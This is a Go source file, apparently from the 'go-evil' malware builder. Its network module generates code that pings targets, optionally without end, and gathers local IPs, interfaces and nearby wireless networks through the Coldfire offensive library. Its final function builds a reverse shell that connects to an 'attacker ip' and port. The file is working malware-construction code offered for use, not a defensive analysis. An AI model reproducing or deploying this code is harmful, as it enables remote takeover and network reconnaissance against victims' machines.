package network

import (
	"fmt"
	"strings"

	"github.com/TeamPhoneix/go-evil/utility/structure"
	"github.com/TeamPhoneix/go-evil/utility/tools"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

// Pings a target, takes in an evil array with the following contents
// ${'target', 'count', 'udp/tcp'}$
// target - ip or addr
// count - How many times to ping, 0 for indefinitely
// udp/tcp - Which protocol do you want to use?

func ping(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "ping_target"
	arr := structure.Create_evil_object(value)

	if arr.Length() != 3 {
		notify.Error(fmt.Sprintf("Expected three values, but recieved %d", arr.Length()), "network.ping()")
	}

	target := arr.Get(0)

	count := tools.String_to_int(arr.Get(1))
	if count == -1 {
		notify.Error(fmt.Sprintf("Failed to convert '%s' to an integer", arr.Get(1)), "network.ping()")
	}

	protocol := strings.ToLower(arr.Get(2))

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(repr_1 []int, count int, repr_2 []int){", function_call),
		"target := spine.variable.get(spine.alpha.construct_string(repr_1))",
		"protocol := spine.variable.get(spine.alpha.construct_string(repr_2))",

		"pinger := fastping.NewPinger()",
		"ra, err := net.ResolveIPAddr(\"ip4:icmp\", target)",
		"if err != nil {",
		"spine.log(err.Error())",
		"}",
		"pinger.AddIPAddr(ra)",
		"switch (protocol){",
		"case \"tcp\":",
		"pinger.Network(\"tcp\")",
		"case \"udp\":",
		"pinger.Network(\"udp\")",
		"default:",
		"spine.log(fmt.Sprintf(\"Unknown protocol %s\", protocol))",
		"}",
		"pinger.OnRecv = func(addr *net.IPAddr, rtt time.Duration) {",
		"spine.variable.set(fmt.Sprintf(\"IP Addr: %s receive, RTT: %v\", addr.String(), rtt))",
		"}",
		"if count == 0{",
		"for {",
		"err = pinger.Run()",
		"if err != nil {",
		"spine.log(err.Error())",
		"}",
		"}",
		"} else{",
		"for i := 0; i < count; i++ {",
		"err = pinger.Run()",
		"if err != nil {",
		"spine.log(err.Error())",
		"}",
		"}}",
		"}"})

	data_object.Add_go_import("fmt")
	data_object.Add_go_import("net")
	data_object.Add_go_import("github.com/tatsushid/go-fastping")
	data_object.Add_go_import("github.com/s9rA16Bf4/notify_handler/go/notify")

	int_target := tools.Generate_int_array_parameter(target)
	int_protocol := tools.Generate_int_array_parameter(protocol)

	return []string{fmt.Sprintf("%s(%s, %d, %s)", function_call, int_target, count, int_protocol)}, structure.Send(data_object)
}

//
//
// Get the local ip address
// The result is placed in a runtime variable
//
//
func get_local_ip(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	call := "get_local_ip"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", call),
		"spine.variable.set(coldfire.GetLocalIp())",
		"}"})

	data_object.Add_go_import("github.com/redcode-labs/Coldfire")

	return []string{fmt.Sprintf("%s()", call)}, structure.Send(data_object)
}

//
//
// Grabs the current wireless interface
// Input None
// The result will be the interface name and mac adress which are placed into seperate runtime variables
//
//
func get_interface(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	call := "get_interface"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", call),
		"i_name, i_mac := coldfire.Iface()",
		"spine.variable.set(i_name)",
		"spine.variable.set(i_mac)",
		"}"})
	data_object.Add_go_import("github.com/redcode-labs/Coldfire")

	return []string{fmt.Sprintf("%s()", call)}, structure.Send(data_object)
}

//
//
// Grabs all interfaces
// Input None
// The return is an evil array containing all found interfaces which is placed in a runtime variable
//
//
func get_interfaces(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	call := "get_interfaces"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", call),
		"interfaces := coldfire.Ifaces()",
		"arr := structure.Create_evil_object(\"\")",
		"for _, d_int := range interfaces{",
		"arr.Append(d_int)",
		"}",
		"spine.variable.set(arr.To_string(\"evil\"))",
		"}"})
	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/structure")

	return []string{fmt.Sprintf("%s()", call)}, structure.Send(data_object)
}

//
//
// Grabs all networks nearby
// Input None
// The return is an evil array containing all found networks which is placed in a runtime variable
//
//
func get_networks(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	call := "get_networks"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", call),
		"networks, err := coldfire.Networks()",
		"if err != nil{",
		"spine.log(err.Error())",
		"}",
		"arr := structure.Create_evil_object(\"\")",
		"for _, d_net := range networks{",
		"arr.Append(d_net)",
		"}",
		"spine.variable.set(arr.To_string(\"evil\"))",
		"}"})
	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/structure")

	return []string{fmt.Sprintf("%s()", call)}, structure.Send(data_object)
}

//
//
// Creates a reverse shell
// Input, evil array, format ${"attacker ip", "attacker port"}$
//
//
func reverse_shell(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	call := "reverse_shell"

	arr := structure.Create_evil_object(value)

	if arr.Length() != 2 {
		notify.Error(fmt.Sprintf("Expected two values, but recieved %d", arr.Length()), "network.reverse_shell()")
	}

	ip := arr.Get(0)
	port := arr.Get(1)

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(repr_1 []int, repr_2 int){", call),
		"param_1 := spine.variable.get(spine.alpha.construct_string(repr_1))",
		"coldfire.Reverse(param_1, repr_2)",
		"}"})
	data_object.Add_go_import("github.com/redcode-labs/Coldfire")

	i_port := tools.String_to_int(port)
	if i_port == -1 {
		notify.Error(fmt.Sprintf("Failed to convert '%s' to an integer", port), "network.reverse_shell()")
	}

	parameter_1 := tools.Generate_int_array_parameter(ip)

	return []string{fmt.Sprintf("%s(%s, %d)", call, parameter_1, i_port)}, structure.Send(data_object)
}
